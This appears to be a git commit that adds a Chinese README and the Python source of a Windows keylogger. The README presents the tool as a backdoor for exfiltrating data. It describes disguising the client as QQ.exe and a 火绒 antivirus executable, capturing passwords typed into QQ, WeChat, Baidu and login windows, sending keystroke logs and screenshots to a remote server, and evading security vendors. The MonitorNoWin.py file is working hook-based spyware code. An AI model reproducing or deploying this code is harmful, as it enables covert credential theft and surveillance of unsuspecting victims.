7516cf2e5e2db05f67a7c7d5341f6e19304b1514
Eternal Night <EternalNight996@gmail.com>
2020-11-26 17:35:50 +0800

    new version add sourcecode dir and exe software (using git add .)

--- README.md
+++ README.md
@@ -1,2 +1,63 @@
-# background_monitor
+#QQ： 2472674814
+#Ahthor：握着玫瑰的屠夫
+#date: 2020.11.26
+# 开发语言python3.78
+# 后门数据回传程序，分三大部分。
+#-----------------成品都在output文件夹里----------------------
+#-----------------源码则在sourcode----------------------------
+# 1.PyHook3对目标机的监控，2.socket客户端 3.socket服务端
+# 使用方法：
+#   1.开启服务端输入公网服务端器IP，如果是测试局域网也行
+#       会在当前目录产生一个名为 Monitor_config.txt的配置文件，
+#       在目标建立同样名和内容文件，或复制过去。
+#   2.把Monitor_config.txt服务端配置文件，放在客户端文件内。
+#是成品话我已经把监控软件放在socket客户端内，所以直接运行。下面
+#   3.进入客户端无弹窗>>进入Msocket>>>用管理权限运行火绒.exe或命令行.
+#   4.返回客户端无弹窗运行QQ.exe
+#   以上就是所有成品的操作流程。如果你在输入密码或者别的时候则会记录起来。
+#   这时你的服务端则会有自动接收下载到服务端。
+#   截屏>>>服务端弹窗>>>MKB>>>images目录下
+#   键盘记录>>>服务端弹窗>>>Monitor_log.txt
+
+#关于源码操作稍微复杂点，感兴趣可以往下看。
+# 如果想看图文教程，则上我的博客：https://www.cnblogs.com/eternalnight/
+# 1.先用python3 运行SocketWinServer.py 
+#导入的库列表1.os, 2.gevent, 3.threading. 其中gevent是第三方库
+#gevent安装方式。在windows或linux终端输入 >> pip install gevent
+# 输入服务端号，就是你本机IP，或域名。
+# 生成一个名为Monitor_config.txt配置文件，接下来就等待客户端回传
+
+# 2.python3 在目标机子运行 SocketWinClient.py
+#导入的库1.os,2.time,3.gevent,4.threading
+#与服务端同理只需要执行 pip install gevent 安装这个库即可
+#弹窗版会提示输入服务端IP和端口号，输入如上一致。
+#则会在当前目录生成一个名为Msocket的目录将监控程序放进去。
+#原理很简单，Socket客户端会监控在Msocket目录下的QQdata\xx11和QQdata\Monitor_log.txt
+#的文件，而监控软件则是将监控的内容记录在上面两个地方。一个是生成一个是搬运。
+
+# 3.将MonitorNoWin.py监控放在客户端目录下的 Msocket目录下运行即可
+#导入的库1.pythoncom, 2.PyHook3, 3.os, 4.time 5.threading 6.win32api 7.PIL
+#监控的库3/1都需要外安装，其中PyHook3无法pip直接安装。
+1.PyHook3库我已经上传我的github,安装方式如下
+# git clone https://github.com/EternalNight996/PyHook3.git
+# cd PyHook3
+# pip install PyHook3-1.6.1-cp37-cp37m-win_amd64.whl
+#库的演示打开example.py即可
+# 2.PIL库安装  pip install pillow
+# 3.win32api安装 pip install pywin32
+安装完库了，则直接python3 MonitorNoWin.py，则开始监控键盘和鼠标。
+监控的内容则放到QQdata/xx11 和 QQdata/Monitor_log.txt
+--------------------------------------------------------------------
+
+其功能：1.监控部分关键词窗口并记录  2.远程实时传输截屏和键盘记录 3.全自动化无需额外操作
+        4.无视各大安全厂商封杀
+后话：做这个软件其问题关键应该是在socket传输上，修修改改无数次。
+    后面版本正在更新>>>>LINUX版的服务端，为什么要做linux服务端？
+    其实我的初衷呢！是因为在做渗透测试，发现meterpreter的内置键盘监听和截屏
+    其功能过于单调和不人性化，我想着能不能做个全自动实时监听来？
+    就这么搞起来了，欢迎交流沟通！！！
+
+如果有像了解更多软件技术细节可以留意我博客会公布在哪。
+https://www.cnblogs.com/eternalnight/
+由于这是初版，也添加了不少限制。还需要后期调整和增加功能，有什么建议可以私聊我。
 
---
+++ sourcecode/MonitorNoWin.py
@@ -0,0 +1,221 @@
+# -*- coding: utf-8 -*-
+# -*- coding: gbk -*-
+
+"""
+author: 握着玫瑰的屠夫
+done date: 2020.11.25
+programing language: python
+programing version: python3.78
+contact: QQ<--2472674814-->  Email<--EternalNight996@gmail.com-->
+describe: Monitor Keyboard and Mouse
+current application version: 1.0
+"""
+import pythoncom
+import PyHook3
+import os
+import time
+import threading
+import win32api
+from PIL import ImageGrab
+#------我们用关键词去筛选，软件会在什么时候去监听记录截屏, 想要监听什么窗口就在下面添加即可
+lists=['百度','QQ','哔哩哔哩','微博','微信','密码','password','账号','account','login','kali linux',
+        'bilibili', 'baidu']
+MSG=""
+title_word=""
+global_title=""
+pathlist={'open_filename':'', 'open_pic_dir':'', 'dos_filename':'',
+        'dos_pic_dir':'', 'dos_config':'', 'pic_msg':''}
+countmouse=10
+
+#hook鼠标监控函数
+def onMouseEvent(event):
+    global lists, MSG, global_title, pathlist, countmouse
+    #引用基层API记录状态
+    mouse_status=event.MessageName
+    pic_msg=""
+    #当鼠标左键和右键点击的时候回触发,下面截屏和键盘记录函数
+    if mouse_status=="mouse left down" or mouse_status=="mouse right down":
+        if global_title in lists:
+            if MSG!="":
+                countmouse+=1
+                try:
+                    getmore('txt', MSG).write_msg_to_txt()
+                except:
+                    t_init=threading.Thread(target=init_setting, name="init data son line")
+                    t_init.start()
+                    t_init.join()
+                try:
+                    #每次处罚到这里标准值就会+1，直到10时就会截屏！
+                    if countmouse%3==0:
+                        getmore('pic', MSG).get_local_image()
+                        getmore('txt', pathlist['pic_msg']).write_msg_to_txt()
+                        pathlist['pic_msg']=''
+                        countmouse=0
+                except:
+                    os.makedirs(pathlist['dos_pic_dir'])
+                win32api.PostQuitMessage()
+            global_title=""
+    return True
+
+#hook键盘监控函数
+def onKeyboardEvent(event):
+    global lists, MSG, title_word, global_title, pathlist
+    words,title='',''
+    status, title_status, break_status=1,1,1
+    #当前监控的的Ascii十进制数值
+    keyid=event.Ascii
+    #Ascii十进制32-127以内，部分是无法显示
+    keychar=chr(event.Ascii)
+    #Ascii明文，大部分都是依靠下面变量去判断
+    keyword=event.Key
+    #当前窗口如QQ或bilibili的名称
+    title=event.WindowName
+    #计算标题函数
+    if title and len(title) >0:
+        for n in range(len(lists)):
+            if len(title) >=len(lists[n]):
+                for tw in title:
+                    words+=tw
+                    if words ==lists[n]:
+                        global_title=words
+                        title_status=0
+                        break_status=0
+                        break
+            if break_status==0:
+                break
+            words=''
+    #下面函数则是键盘记录的核心，我已经绞尽脑汁了。
+    if title_status==0:
+        if (title_word!=title and keyword!="Lcontrol" and keyword!="Rcontrol"
+            and keyword!="Lmenu" and keyword!="Rmenu" and keyword!="Capital"
+            and keyword!="Lshift" and keyword!="Rshift"
+            ):
+            title_word=title
+            MSG=getmore('txt',None).get_local_time()+title+"窗口: "
+        if 127 > keyid >32:
+            MSG+=keychar
+        else:
+            if keyword=="Return":
+                MSG+="<回车>"
+                status=0
+            elif keyword=="Tab":
+                MSG+="<水平制表>"
+            elif keyword=="Back":
+                MSG+="<退格>"
+            elif keyword=="Delete":
+                MSG+="<删除>"
+            elif keyword=="Space":
+                MSG+="<空格>"
+    if status == 0:
+        if MSG!="":
+            #当触发如回车或者一些特殊按键时候则触发记录
+            try:
+                getmore('txt', MSG).write_msg_to_txt()
+            except:
+                t_init=threading.Thread(target=init_setting, name="init data son line")
+                t_init.start()
+                t_init.join()
+            win32api.PostQuitMessage()
+        title_word=""
+        global_title=""
+        kwords=""
+    # 同鼠标事件监听函数的返回值
+    return True
+
+#一个算法class集合
+class getmore:
+    def __init__(self, keyword, msg):
+        global pathlist
+        self.keyword, self.msg, self.pathlist=keyword, msg, pathlist
+    #获取本地时间函数
+    def get_local_time(self):
+        if self.keyword=='txt':
+            return time.strftime('%Y-%m-%d_%H:%M: ', time.localtime(time.time()))
+        elif self.keyword=='pic':
+            return time.strftime('%Y-%m-%d_%Hh%Mm%Ss', time.localtime(time.time()))
+        elif self.keyword=='second':
+            return time.strftime('%S',time.localtime(time.time()))
+
+    #获取截屏并生成当前时间格式存储本地
+    def get_local_image(self):
+        global pathlist
+        pic_lists =os.listdir(self.pathlist['dos_pic_dir'])
+        #检测客户端本地存储超过一百张则全部清空
+        if len(pic_lists) >2000:
+            for pl in pic_lists:
+                fpath=self.pathlist['dos_pic_dir']+pl
+                if os.path.isfile(fpath):
+                    os.remove(fpath)
+        pic=ImageGrab.grab()
+        pic_name='mouse_%s.jpg' %getmore('pic',self.msg).get_local_time()
+        pic_save_to='{}{}'.format(pathlist['open_pic_dir'],pic_name)
+        pic.save('%s' %pic_save_to)
+        pathlist['pic_msg']=pic_save_to
+
+    #将监控到的消息写入本地
+    def write_msg_to_txt(self):
+        f=open(self.pathlist['open_filename'],'a')
+        f.write(self.msg+'\x0A')
+        f.close()
+
+#初始化数据和生成输出文件以及目录，所以值都在这里面修改。
+def init_setting():
+    global pathlist
+    #-------------建立目录和文件信息-----------------------------
+    lhome=os.path.abspath('.')
+    lhomelist=lhome.split('\\')
+    #下面有两种格式，一种用pyopen去打开，一种则是dos格式。如果想要修改生成的目录名则修改关键词即可
+    #如果修改了，相应socket传输程序也需要修改
+    pathlist['dos_filename']=lhome+'\\QQdata\\Monitor_log.txt'
+    pathlist['dos_pic_dir']=lhome+'\\QQdata\\xx11\\'
+    for n in range(len(lhomelist)):
+        pathlist['open_filename']+=lhomelist[n]+'/'
+        pathlist['open_pic_dir']+=lhomelist[n]+'/'
+    pathlist['open_filename']+='QQdata/Monitor_log.txt'
+    pathlist['open_pic_dir']+='QQdata/xx11/'
+    times=0
+    while True:
+        times+=1
+        if os.path.exists(pathlist['dos_filename']) and os.path.exists(pathlist['dos_pic_dir']):
+            break
+        elif times >=5:
+            pathlist['open_filename']='D:/QQdata/Monitor_log.txt'
+            pathlist['open_pic_dir']='D:/QQdata/xx11/'
+            pathlist['dos_filename']='D:\\QQdata\\Monitor_log.txt'
+            pathlist['dos_pic_dir']='D:\\QQdata\\xx11\\'
+            break
+        if not os.path.exists(pathlist['dos_pic_dir']):
+            try:
+                os.makedirs(pathlist['dos_pic_dir'])
+            except:
+                pass
+        if not os.path.exists(pathlist['dos_filename']):
+            try:
+                os.system('type nul >%s' %pathlist['dos_filename'])
+            except:
+                pass
+#主要的监控集
+def runhook():
+    global pathlist
+    while True:
+        # 创建一个“钩子”管理对象
+        hm = PyHook3.HookManager()
+        # 监听所有鼠标事件钩子
+        hm.MouseAll = onMouseEvent
+        hm.HookMouse()
+        # 监听所有键盘事件钩子
+        hm.KeyDown = onKeyboardEvent
+        hm.HookKeyboard()
+        # 进入循环，如不手动关闭，程序将一直处于监听状态
+        pythoncom.PumpMessages()
+def main():
+    #初始化数据
+    init_setting()
+    #把主要的监控运行设置线程，以免出BUG直接断开
+    t_hook=threading.Thread(target=runhook,name='hook father line')
+    #开始线程
+    t_hook.start()
+    #join可以防止阻塞，造成系统卡顿
+    t_hook.join()
+if __name__ == "__main__":
+    main()
